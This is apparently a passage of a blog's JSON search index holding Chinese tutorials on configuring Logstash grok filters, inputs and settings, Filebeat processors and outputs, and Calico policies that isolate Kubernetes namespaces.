16:15","objectID":"/post/2299/:1:1","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"举例: 日志内置正则格式55.3.244.1 GET /index.html 15824 0.043 logstash配置 input { file { path =\u003e \"/var/log/http.log\" } } filter { grok { # 对message字段进行匹配 match =\u003e { \"message\" =\u003e \"%{IP:client} %{WORD:method} %{URIPATHPARAM:request} %{NUMBER:bytes} %{NUMBER:duration}\" } } } 经过grok过滤后，事件会添加如下字段 client: 55.3.244.1 method: GET request: /index.html bytes: 15824 duration: 0.043 ","date":"2021-03-31 16:15","objectID":"/post/2299/:1:2","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"2.使用自定义正则格式 (?\u003cfield_name\u003ethe pattern here) field_name代表正则解析出来内容，使用的字段名称，the pattern here代表正则表达式 例如: (?\u003cbytes\u003e[0-9]+) ","date":"2021-03-31 16:15","objectID":"/post/2299/:1:3","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"二、配置选项 ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:0","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"keep_empty_captures 类型: boolean 默认值: false 描述: 如果捕获的值是空值，是否保留字段，例如 正则: \\|IP=(?\u003cclientip\u003e.*)\\|,这个正则可能会匹配到空的内容 日志内容: |IP=|,这个内容会被上面的正则成功匹配，但是匹配的内容是空的，默认情况下事件中不会有clientip字段，如下所示，如果要保留clientip字段，需要将参数的值改为true 结果: { \"@timestamp\" =\u003e 2021-04-01T01:59:39.908Z, \"message\" =\u003e \"|IP=|\", \"host\" =\u003e \"logstash01\", \"@version\" =\u003e \"1\" } ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:1","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"match 类型: hash 默认值: {} 描述: 定义与日志匹配的正则，字段名称 例如： filter { grok { match =\u003e { \"message\" =\u003e \"Duration: %{NUMBER:duration}\" } } } 也可以使用多组正则表达式,如下： filter{ grok{ match=\u003e{ \"message\"=\u003e[ \"Duration: %{NUMBER:duration} Data: %{DATA:data}\\|\", \"Speed: %{NUMBER:speed} Data: %{DATA:data}\\|\" ] } } } ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:2","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"break_on_match 类型: boolean 默认值: true 描述: 如果有多组正则的话，成功匹配一组正则就会停止匹配。如果设置为false,将会把每组的正则进行匹配。例如 正则: [\"Duration: %{NUMBER:duration} Data: %{DATA:data}\\|\",\"Duration: %{NUMBER:sudu} Data: %{DATA:data}\\|\"] 日志: Duration: 120 Data: asdasd| 结果: { \"sudu\" =\u003e \"120\", \"@timestamp\" =\u003e 2021-04-01T02:53:43.651Z, \"duration\" =\u003e \"120\", \"data\" =\u003e [ [0] \"asdasd\", [1] \"asdasd\" ], \"message\" =\u003e \"Duration: 120 Data: asdasd|\", \"host\" =\u003e \"ops-elk-es01\", \"@version\" =\u003e \"1\" } ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:3","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"named_captures_only 类型: boolean 默认值: true 描述: 如果设置为true,正则匹配如果没有指定字段名称，则匹配到的内容不会添加到事件中。设置为false，如果使用的是预定义正则，正则名称将作为字段名 ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:4","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"overwrite 类型: array 默认值: [] 描述: 指定要覆盖的字段名称。如果不指定，在字段名冲突的情况下，匹配内容将会作为数组的一个元素加入到字段中。 例如: 日志内容: May 29 16:37:11 sadness logger: hello world filter { grok { match =\u003e { \"message\" =\u003e \"%{SYSLOGBASE} %{DATA:message}\" } overwrite =\u003e [ \"message\" ] } } 最后的结果中事件的message字段的内容是hello world ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:5","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"pattern_definitions 类型: hash 默认值: {} 描述: 定义正则 例如: pattern_definitions =\u003e {\"mypattern\" =\u003e \"\\d+|%{DATA:data}\"} ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:6","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"patterns_dir 类型: array 默认值: [] 描述: 指定预定义正则的路径，将从这个路径下的文件中寻找预定义正则 例如: patterns_dir =\u003e [\"/opt/logstash/patterns\", \"/opt/logstash/extra_patterns\"] 预定义正则的格式:NAME PATTERN。例如:NUMBER \\d+ ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:7","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"patterns_files_glob 类型: string 默认值: * 描述: 指定patterns_dir配置的目录中哪些文件是可以使用的 ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:8","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"tag_on_failure 类型: array 默认值: [\"_grokparsefailure\"] 描述: 正则匹配失败时,会在tags字段中追加一个标签，这里配置的是标签名称 ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:9","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"tag_on_timeout 类型: string 默认值: “_groktimeout” 描述: 如果正则匹配超时，则应用标记 ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:10","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"target 类型: string 默认值: 无 描述: 定义用于放置匹配项的namespace ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:11","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"timeout_millis 类型: number 默认值: 30000 描述: 匹配的超时时间。针对单组正则。 ","date":"2021-03-31 16:15","objectID":"/post/2299/:2:12","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"三、公共选项 ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:0","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"add_field 类型: hash 默认值: {} 描述: 在事件中添加字段 filter { grok { add_field =\u003e { \"foo_%{somefield}\" =\u003e \"Hello world, from %{host}\" \"new_field\" =\u003e \"new_static_value\" } } } ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:1","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"add_tag 类型: array 默认值: [] 描述: 在事件中添加tag filter { grok { add_tag =\u003e [ \"foo_%{somefield}\", \"taggedy_tag\"] } } ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:2","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"enable_metric 类型: boolean 默认值: true 描述: 是否启用当前插件的metric ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:3","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"id 类型: string 默认值: 无 描述: 向插件配置添加唯一的ID。如果未指定ID，Logstash将生成一个。强烈建议在配置中设置此ID。当您有两个或更多相同类型的插件时（例如，如果您有两个grok过滤器），这一点特别有用。在这种情况下，添加一个命名ID将有助于在使用monitor api时监视logstash。 ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:4","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"periodic_flush 类型: boolean 默认值: false 描述: 定期调用filter flush方法。 ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:5","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"remove_field 类型: array 默认值: [] 描述: 删除字段 filter { grok { remove_field =\u003e [ \"foo_%{somefield}\", \"my_extraneous_field\" ] } } ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:6","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"remove_tag 类型: array 默认值: [] 描述: 删除tag filter { grok { remove_tag =\u003e [ \"foo_%{somefield}\", \"sad_unwanted_tag\"] } } ","date":"2021-03-31 16:15","objectID":"/post/2299/:3:7","tags":["elk","logstash"],"title":"ELK-logstash配置fileter插件之grok(四)","uri":"/post/2299/"},{"categories":["ELK日志收集"],"content":"所有input插件均支持的参数 add_field: 在事件中添加属性。格式{\"name\" =\u003e \"zhangsan\" \"age\" =\u003e \"11\"} codec: 指定编解码器，默认plain enable_metric: 是否启用指标日志，默认true id: 配置插件ID。如果没有指定ID, Logstash将生成一个。强烈建议在您的配置中设置此ID。当你有两个或两个以上相同类型的插件时，这是特别有用的。例如，如果你有两个kafka input配置。在这种情况下，添加ID将有助于在使用monitoring APIs时 监控Logstash。 tags: 添加标签。格式[\"test\", \"ok\"] type: 向事件中添加type字段，值是string 这里介绍两种input类型的插件，分别是kafka和redis ","date":"2021-03-25 13:04","objectID":"/post/2288/:0:0","tags":["elk","logstash"],"title":"ELK-logstash配置管道input(三)","uri":"/post/2288/"},{"categories":["ELK日志收集"],"content":"1. kafka 使用kafka作为input，需要安装kafka插件bin/logstash-plugin install logstash-input-kafka。 kafka可以插件从Kafka topic中读取事件。 配置参数 bootstrap_servers: kafka实例的地址列表 topics: topic列表。默认[“logstash”] topics_pattern: 使用正则表达式匹配topic connections_max_idle_ms: 在指定的毫秒数之后关闭空闲连接。 consumer_threads: 线程数量，最好与kafka分片数量想同 decorate_events: 是否在事件中添加kafka元数据。可以提供给过滤器使用。元数据包括topic、consumer_group、partition、offset、key 其他参数: https://www.elastic.co/guide/en/logstash/6.8/plugins-inputs-kafka.html#plugins-inputs-kafka-options 配置示例: input { kafka { add_field =\u003e { \"service\" =\u003e \"gateway\" \"env\" =\u003e \"test\" } tags =\u003e [\"test\",\"ok\"] bootstrap_servers =\u003e [\"localhost:9092\"] topics =\u003e [\"soulchild-test\"] codec =\u003e json consumer_threads =\u003e 2 } } output { elasticsearch { hosts =\u003e [\"http://es-01:9200\", \"http://es-02:9200\", \"http://es-03:9200\"] index =\u003e \"kafka-test-%{+YYYY.MM.dd}\" } } ","date":"2021-03-25 13:04","objectID":"/post/2288/:0:1","tags":["elk","logstash"],"title":"ELK-logstash配置管道input(三)","uri":"/post/2288/"},{"categories":["ELK日志收集"],"content":"2.redis 使用redis作为input，需要安装redis插件bin/logstash-plugin install logstash-input-redis 配置参数 batch_count: EVAL命令返回的事件数,默认125，每次从redis获取125个事件 data_type: list,channel,pattern_channel db: redis db编号 host: redis连接主机 path: redis socket路径 key: redis订阅通道名称或者list的key名称 password: redis密码 port: redis端口号 ssl: 启用ssl threads: 线程数，默认1 timeout: 初始连接超时(秒) command_map: 如果redis命令被重命名，这里可以配置redis原始命令的映射，例如： command_map =\u003e { \"lpush\" =\u003e \"newlpush\" } 配置示例: input { redis { data_type =\u003e \"list\" db =\u003e 0 host =\u003e \"1.1.1.1\" key =\u003e \"test-log\" } } output { elasticsearch { hosts =\u003e [\"http://es-01:9200\", \"http://es-02:9200\", \"http://es-03:9200\"] index =\u003e \"redis-test-%{+YYYY.MM.dd}\" } } ","date":"2021-03-25 13:04","objectID":"/post/2288/:0:2","tags":["elk","logstash"],"title":"ELK-logstash配置管道input(三)","uri":"/post/2288/"},{"categories":["ELK日志收集"],"content":"logstash.yml logstash全局属性、启动、执行相关配置 node.name: 节点的描述名称，默认是主机名 path.data: Logstash插件及用于持久化的目录,默认LOGSTASH_HOME/data pipeline.id: pipeline的id，默认main pipeline.java_execution: 使用java执行引擎，默认false path.logs: 日志存放路径，默认LOGSTASH_HOME/logs log.level: 日志级别，fatal，error，warn，info，debug，trace，默认info config.debug: 是否为调试模式，默认false path.config: logstash管道配置文件路径 pipeline.workers: 执行管道的过滤器和输出阶段的工作线程数量。默认CPU核心数 pipeline.batch.size: 一个工作线程可以执行的最大事件数 其他参数: https://www.elastic.co/guide/en/logstash/6.8/logstash-settings-file.html ","date":"2021-03-24 15:47","objectID":"/post/2290/:0:1","tags":["elk","logstash"],"title":"ELK-logstash配置文件(二)","uri":"/post/2290/"},{"categories":["ELK日志收集"],"content":"pipelines.yml 在单个Logstash实例中运行多个管道的相关配置. 例如下面的配置定义了管道id，这个管道使用的队列类型，这个管道从哪里读取配置文件 - pipeline.id: another_test queue.type: persisted path.config: \"/tmp/logstash/*.config\" ","date":"2021-03-24 15:47","objectID":"/post/2290/:0:2","tags":["elk","logstash"],"title":"ELK-logstash配置文件(二)","uri":"/post/2290/"},{"categories":["ELK日志收集"],"content":"jvm.options 配置logstash的jvm参数 ","date":"2021-03-24 15:47","objectID":"/post/2290/:0:3","tags":["elk","logstash"],"title":"ELK-logstash配置文件(二)","uri":"/post/2290/"},{"categories":["ELK日志收集"],"content":"log4j2.properties log4j2的相关配置 ","date":"2021-03-24 15:47","objectID":"/post/2290/:0:4","tags":["elk","logstash"],"title":"ELK-logstash配置文件(二)","uri":"/post/2290/"},{"categories":["ELK日志收集"],"content":"startup.options (Linux) 修改此配置，在使用bin/system-install，可以使二进制安装的logstash，也支持systemd管理 例如: ./system-install /usr/local/logstash-6.8.9/config/startup.options systemd ","date":"2021-03-24 15:47","objectID":"/post/2290/:0:5","tags":["elk","logstash"],"title":"ELK-logstash配置文件(二)","uri":"/post/2290/"},{"categories":["ELK日志收集"],"content":"一、二进制安装 # 下载 wget https://artifacts.elastic.co/downloads/logstash/logstash-6.8.9.tar.gz # 安装 tar xf logstash-6.8.9.tar.gz mv logstash-6.8.9 /usr/local/ # 启动 /usr/local/logstash-6.8.9/bin/logstash -f logstash.conf ","date":"2021-03-24 14:04","objectID":"/post/2286/:0:1","tags":["elk","logstash"],"title":"ELK-logstash安装和简介(一)","uri":"/post/2286/"},{"categories":["ELK日志收集"],"content":"二、yum安装 rpm --import https://artifacts.elastic.co/GPG-KEY-elasticsearch cat \u003e /etc/yum.repos.d/logstash.repo \u003c\u003cEOF [logstash-6.x] name=Elastic repository for 6.x packages baseurl=https://artifacts.elastic.co/packages/6.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md EOF yum install logstash ","date":"2021-03-24 14:04","objectID":"/post/2286/:0:2","tags":["elk","logstash"],"title":"ELK-logstash安装和简介(一)","uri":"/post/2286/"},{"categories":["ELK日志收集"],"content":"三、logstash简介 logstash是一个类似实时流水线的开源数据传输引擎，将数据实时地从一个数据源传输到另一个数据源中。在数据传输过程中可以对数据进行清洗、加工等操作。 logstash数据传输过程分为三个阶段——输入、过滤、输出。在实现上，它们由三种类型的插件实现，即输入插件、过滤器插件、输出插件。除了这三种外还有一个叫编解码器(codec)的插件。编解码器插件用于在数据进入和离开管道时对数据做解码和编码，所以它一般是和输入、输出插件结合在一起使用。 ","date":"2021-03-24 14:04","objectID":"/post/2286/:0:3","tags":["elk","logstash"],"title":"ELK-logstash安装和简介(一)","uri":"/post/2286/"},{"categories":["ELK日志收集"],"content":"四、配置文件的结构 每个部分包含一个或多个插件的配置选项。如果您指定了多个过滤器，它们将按照它们在配置文件中出现的顺序应用。 input { ... } filter { ... } output { ... } 一个插件的配置包括插件名和该插件的设置块。例如，这个input部分配置了两个文件输入: input { file { path =\u003e \"/var/log/messages\" type =\u003e \"syslog\" } file { path =\u003e \"/var/log/apache/access.log\" type =\u003e \"apache\" } } 配置文件不通数据类型的写法 array: users =\u003e [ {id =\u003e 1, name =\u003e bob}, {id =\u003e 2, name =\u003e jane} ] list: path =\u003e [ \"/var/log/messages\", \"/var/log/*.log\" ] boolean: ssl_enable =\u003e true bytes: my_bytes =\u003e \"1113\" # 1113 bytes my_bytes =\u003e \"10MiB\" # 10485760 bytes my_bytes =\u003e \"100kib\" # 102400 bytes my_bytes =\u003e \"180 mb\" # 180000000 bytes codec: codec =\u003e \"json\" hash: hash是键值对的集合，指定格式为\"field1\" =\u003e “value1”。注意，多个键值条目用空格而不是逗号分隔。 match =\u003e { \"field1\" =\u003e \"value1\" \"field2\" =\u003e \"value2\" ... } 条件判断 if EXPRESSION { ... } else if EXPRESSION { ... } else { ... } 支持下面这些条件操作符 等式: ==, !=, \u003c, \u003e, \u003c=, \u003e= 正则: =~, !~ 包含: in, not in 逻辑: and, or, nand, xor ","date":"2021-03-24 14:04","objectID":"/post/2286/:0:4","tags":["elk","logstash"],"title":"ELK-logstash安装和简介(一)","uri":"/post/2286/"},{"categories":["kubernetes"],"content":"一、准备环境 创建namespace: pp-dev、pp-test、kk-dev、kk-test 每个namespace创建两个应用 apiVersion: apps/v1 kind: Deployment metadata: name: nginx1 #namespace: pp-test spec: selector: matchLabels: app: nginx1 template: metadata: labels: app: nginx1 author: soulchild spec: containers: - name: nginx image: nginx:1.14.2 ports: - containerPort: 80 --- apiVersion: apps/v1 kind: Deployment metadata: name: client #namespace: pp-test spec: selector: matchLabels: app: client template: metadata: labels: app: client author: soulchild spec: containers: - name: busybox image: busybox:1.33.0 args: [\"sleep\", \"1000000\"] kubectl apply -n pp-dev -f nginx.yaml kubectl apply -n pp-test -f nginx.yaml kubectl apply -n kk-dev -f nginx.yaml kubectl apply -n kk-test -f nginx.yaml 配置完后测试网络正常 ","date":"2021-03-24 09:29","objectID":"/post/2273/:0:1","tags":["k8s"],"title":"k8s使用calico实现不同namespace网络隔离","uri":"/post/2273/"},{"categories":["kubernetes"],"content":"二、配置globalnetworkpolicy 官方文档: https://docs.projectcalico.org/reference/resources/globalnetworkpolicy#selectors 1.给namespace打标签 kubectl label namespaces pp-dev enable-env-isolate-policy=\"true\" kubectl label namespaces pp-dev env=\"dev\" kubectl label namespaces pp-test enable-env-isolate-policy=\"true\" kubectl label namespaces pp-test env=\"test\" kubectl label namespaces kk-dev enable-env-isolate-policy=\"true\" kubectl label namespaces kk-dev env=\"dev\" kubectl label namespaces kk-test enable-env-isolate-policy=\"true\" kubectl label namespaces kk-test env=\"test\" 2.配置拥有env=dev标签的namespace互通 apiVersion: crd.projectcalico.org/v1 kind: GlobalNetworkPolicy metadata: name: allow-label-env-dev-namesapce spec: namespaceSelector: enable-env-isolate-policy == \"true\" # 与标签匹配的namespace，生效下面配置的规则 order: 101 # 配置优先级，越小越先执行策略 ingress: # 配置入口规则 - action: Allow # 允许下面指定的规则访问,其他进来的流量拒绝,不会拒绝公网流量 source: namespaceSelector: env == \"dev\" # 根据标签选择器,选出namespace,namespace下的所有工作端点定义为源地址 destination: namespaceSelector: env == \"dev\" # 根据标签选择器,选出namespace,namespace下的所有工作端点定义为目标地址 egress: - action: Allow # 允许所有出去的流量 工作端点即Workload endpoint，calico默认会为每个容器分配一个workload-endpoint 3.配置拥有env=test标签的namespace互通 apiVersion: crd.projectcalico.org/v1 kind: GlobalNetworkPolicy metadata: name: allow-label-env-test-namesapce spec: namespaceSelector: enable-env-isolate-policy == \"true\" order: 100 ingress: - action: Allow source: namespaceSelector: env == \"test\" destination: namespaceSelector: env == \"test\" egress: - action: Allow 这里的入口和出口是相对于策略执行者，而非pod ","date":"2021-03-24 09:29","objectID":"/post/2273/:0:2","tags":["k8s"],"title":"k8s使用calico实现不同namespace网络隔离","uri":"/post/2273/"},{"categories":["kubernetes"],"content":"三、测试dev和test的命名空间互通情况 ip信息 00424-jfw5lsbri1b.png kk-dev的服务访问pp-dev的服务 nginx正常访问 67253-0dfubigby71.png kk-dev的服务访问kk-test和pp-test的服务 nginx访问超时 56095-ef68x96t15u.png 91091-o6doszl9uk.png pp-test访问kk-test的服务 nginx正常访问 96370-859rk8nqv7u.png pp-test访问pp-dev和kk-dev的服务 nginx访问超时 70378-1a96k23ldul.png 42119-loufx5xxqw.png ","date":"2021-03-24 09:29","objectID":"/post/2273/:0:3","tags":["k8s"],"title":"k8s使用calico实现不同namespace网络隔离","uri":"/post/2273/"},{"categories":["kubernetes"],"content":"四、总结 含有enable-env-isolate-policy=“true\"的namespace才会应用我们定义的网络策略。 最终效果是env=test的命名空间下的pod可以互相访问 env=dev的命名空间下的pod可以互相访问 2020.4.11 上面的配置当使用nodePort时会发现也不能访问 修改后的策略如下: 1.拒绝env=dev的命名空间中的pod访问test的命名空间中的pod apiVersion: crd.projectcalico.org/v1 kind: GlobalNetworkPolicy metadata: name: deny-dev-namesapce-to-test spec: namespaceSelector: env == \"dev\" ingress: - action: Allow egress: - action: Deny destination: namespaceSelector: env == \"test\" - action: Allow 2.拒绝env=test的命名空间中的pod访问dev的命名空间中的pod apiVersion: crd.projectcalico.org/v1 kind: GlobalNetworkPolicy metadata: name: deny-dev-namesapce-to-test spec: namespaceSelector: env == \"test\" ingress: - action: Allow egress: - action: Deny destination: namespaceSelector: env == \"dev\" - action: Allow ","date":"2021-03-24 09:29","objectID":"/post/2273/:0:4","tags":["k8s"],"title":"k8s使用calico实现不同namespace网络隔离","uri":"/post/2273/"},{"categories":["ELK日志收集"],"content":"您可以在配置中定义processors,以便在事件发送到配置的output之前对其进行处理,比如删除，添加字段等等。 ","date":"2021-03-22 17:58","objectID":"/post/2272/:0:0","tags":["elk","filebeat"],"title":"ELK-filebeat配置处理器(八)","uri":"/post/2272/"},{"categories":["ELK日志收集"],"content":"一、定义处理器 处理器可以定义在全局或者一些input中,还可以使用一些条件判断作出不同选择 processors: - \u003cprocessor_name\u003e: when: \u003ccondition\u003e \u003cparameters\u003e - \u003cprocessor_name\u003e: when: \u003ccondition\u003e \u003cparameters\u003e 下面是支持的处理器(具体用法：https://www.elastic.co/guide/en/beats/filebeat/6.8/defining-processors.html#processors) add_cloud_metadata add_locale decode_json_fields drop_event drop_fields include_fields rename add_kubernetes_metadata add_docker_metadata add_host_metadata dissect dns add_process_metadata 注意：高版本的filebeat支持更多的类型 支持的条件类型(具体用法：https://www.elastic.co/guide/en/beats/filebeat/6.8/defining-processors.html#conditions) equals contains regexp range has_fields or and not ","date":"2021-03-22 17:58","objectID":"/post/2272/:0:1","tags":["elk","filebeat"],"title":"ELK-filebeat配置处理器(八)","uri":"/post/2272/"},{"categories":["ELK日志收集"],"content":"二、简单介绍几个常用的处理器 1.drop_event：删除事件，必须指定条件 # 将事件中level属性等于debug的事件删除 processors: - drop_event: when.equals: level: \"debug\" 2.drop_fields: 删除事件中的属性(字段)，可以没有条件 # 删除fields中指定的所有字段 processors: - drop_fields: fields: - beat - host - input - source 3.include_fields: 指定哪些属性(字段)不删除，其他的都会被删除 # 除了message属性，其他属性全部删除 processors: - include_fields: fields: [\"message\"] 4.rename: 修改属性(字段)的名称。 配置参数: fields: from: 属性(字段)的原始名称 to: 属性(字段)的新名称 ignore_missing: 如果缺少重命名的属性(字段)，则不记录任何错误。默认false fail_on_error: 重命名失败是否报错，默认true # 将log下的file字段名称改为aaa processors: - rename: fields: - from: \"log.file\" - to: \"log.aaa\" 5.dissect: 将字段按照指定表达式来解析，将解析出来的内容添加到事件的属性中。 tokenizer: 指定表达式 field: 表达式匹配哪个字段 target_prefix: 添加到哪个属性下 # 使用空格分割message字段的内容%{xxx}代表新的key的名称,需要自定义。将key1和key2添加到事件的属性中 processors: - dissect: tokenizer: \"%{key1} %{key2}\" field: \"message\" target_prefix: \"\" 如果解析出错，会在log.flags中添加[dissect_parsing_error]。 ","date":"2021-03-22 17:58","objectID":"/post/2272/:0:2","tags":["elk","filebeat"],"title":"ELK-filebeat配置处理器(八)","uri":"/post/2272/"},{"categories":["ELK日志收集"],"content":"filebeat支持的output有很多种,这里介绍三种配置。es,logstash,kafka。 Elasticsearch Logstash Kafka Redis File Console Cloud ","date":"2021-03-22 09:47","objectID":"/post/2269/:0:0","tags":["elk","filebeat"],"title":"ELK-filebeat配置output(七)","uri":"/post/2269/"},{"categories":["ELK日志收集"],"content":"一、Elasticsearch 示例 output.elasticsearch: hosts: [\"https://localhost:9200\"] index: \"filebeat-%{[beat.version]}-%{+yyyy.MM.dd}\" ssl.certificate_authorities: [\"/etc/pki/root/ca.pem\"] ssl.certificate: \"/etc/pki/client/cert.pem\" ssl.key: \"/etc/pki/client/cert.key\" 使用%{[]}可以引用事件中的属性。 配置参数 enable: 是否启用这个output配置 hosts: 指定es主机列表。eg:hosts: [\"10.45.3.2:9220\", \"10.45.3.1:9230\"] compression_level: gzip压缩级别。默认为0禁用压缩。压缩级别必须在1（最佳速度）到9（最佳压缩）的范围内。增加压缩级别会减少网络使用，但会增加cpu使用。 escape_html: 是否将字符串中的html转义，默认true。 worker: 为每个es节点的开启的工作线程数量 username: 用户名 password: 密码 parameters: http url参数字典 protocol: http或https协议 path: es的url访问路径。 headers: 自定义请求头 index: 索引名称。默认是filebeat-%{[beat.version]}-%{+yyyy.MM.dd},如果要修改索引名必须配置下面的选项。 setup.template.name 和 setup.template.pattern output.elasticsearch: hosts: [\"es01:9200\", \"es02:9200\", \"es03:9200\"] index: soulchild-%{+yyyy.MM.dd} setup.template.name: \"soulchild\" setup.template.pattern: \"soulchild-*\" indices: 这个参数可以根据一些条件，来写入不同的索引 index: 索引名称 mappings: 这里是一个字典，会与index的值做匹配，匹配的值就是最后的索引名 default: 默认值 when: 条件 下面举一些例子： eg1: output.elasticsearch: hosts: [\"http://localhost:9200\"] indices: - index: \"warning-%{[beat.version]}-%{+yyyy.MM.dd}\" when.contains: # 如果一个事件中的message字段包含\"WARN\" ，索引名称就是\"warning-%{[beat.version]}-%{+yyyy.MM.dd}\" message: \"WARN\" - index: \"error-%{[beat.version]}-%{+yyyy.MM.dd}\" when.contains: # 如果一个事件中的message字段包含\"ERR\" ，索引名称就是\"error-%{[beat.version]}-% message: \"ERR\" eg2: output.elasticsearch: hosts: [\"http://localhost:9200\"] indices: - index: \"%{[fields.log_type]}\" # 如果事件中\"fields.log_type\"字段的值是critical，那么索引就是sev1，如果是normal那么索引名就是sev2，没有匹配的项索引名就是sev3 mappings: critical: \"sev1\" normal: \"sev2\" default: \"sev3\" bulk_max_size: 单个es处理的最大事件数。默认值为50 backoff.init: 连接es失败时，等待多少秒进行第一次重连。每重连一次按照指数的方式增加尝试连接的时间间隔，直到backoff.max秒 backoff.max: 网络错误后，在尝试连接到es之前等待的最大秒数。缺省值为60秒。 timeout: http请求的超时时间 ssl: ssl相关配置.https://www.elastic.co/guide/en/beats/filebeat/6.8/configuration-ssl.html output.elasticsearch.hosts: [\"https://192.168.1.42:9200\"] output.elasticsearch.ssl.certificate_authorities: [\"/etc/pki/root/ca.pem\"] output.elasticsearch.ssl.certificate: \"/etc/pki/client/cert.pem\" output.elasticsearch.ssl.key: \"/etc/pki/client/cert.key\" ","date":"2021-03-22 09:47","objectID":"/post/2269/:0:1","tags":["elk","filebeat"],"title":"ELK-filebeat配置output(七)","uri":"/post/2269/"},{"categories":["ELK日志收集"],"content":"二、Logstash 示例 output.logstash: hosts: [\"127.0.0.1:5044\"] 每个事件都包含如下字段 { ... \"@metadata\": { \"beat\": \"filebeat\", \"version\": \"6.8.14\" \"type\": \"doc\" } } 配置参数 enabled: 是否启用配置 hosts: 指定logstash主机列表。禁用负载均衡后，如果配置了多台主机，则随机选择一台主机(无优先级)。如果一个主机变得不可达，另一个主机被随机选择。 compression_level: gzip压缩级别。默认为0禁用压缩。压缩级别必须在1（最佳速度）到9（最佳压缩）的范围内。增加压缩级别会减少网络使用，但会增加cpu使用。 escape_html: 是否将字符串中的html转义，默认true。 worker: 为每个logstash节点开启的工作线程数量。 loadbalance: 是否启用负载均衡 ttl: 与logstash建立连接的存活时间 bulk_max_size: 单个logstash处理的最大事件数。默认值为50 backoff.init: 连接logstash失败时,等待多少秒进行第一次重连。每重连一次按照指数的方式增加尝试连接的时间间隔，直到backoff.max秒 backoff.max: 网络错误后，在尝试连接到logstash之前等待的最大秒数。缺省值为60秒。 ","date":"2021-03-22 09:47","objectID":"/post/2269/:0:2","tags":["elk","filebeat"],"title":"ELK-filebeat配置output(七)","uri":"/post/2269/"},{"categories":["ELK日志收集"],"content":"三、Kafka 示例 output.kafka: hosts: [\"kafka1:9092\", \"kafka2:9092\", \"kafka3:9092\"] # 指定主题 topic: '%{[fields.log_topic]}' partition.round_robin: reachable_only: false required_acks: 1 compression: gzip max_message_bytes: 1000000 这个output适用于0.11到2.0.0之间的所有Kafka版本。旧版本也可以工作，但不在维护。 配置参数 enable: 是否启用配置 hosts: kafka broker节点地址列表 version: kafka的版本号。0.8.2.0 ~ 2.0.0。默认1.0.0 worker: 为每个kafka节点开启的工作线程数量。 username: kafka用户名 password: kafka密码 topic: 指定主题 topics: 这个和上面es中的indices类似 topic: 主题名称 mappings: 这里是一个字典，会与topic的值做匹配，匹配的值就是最后的索引名 default: 默认值 when: 条件 key: 事件的key，用于计算hash值 partition: 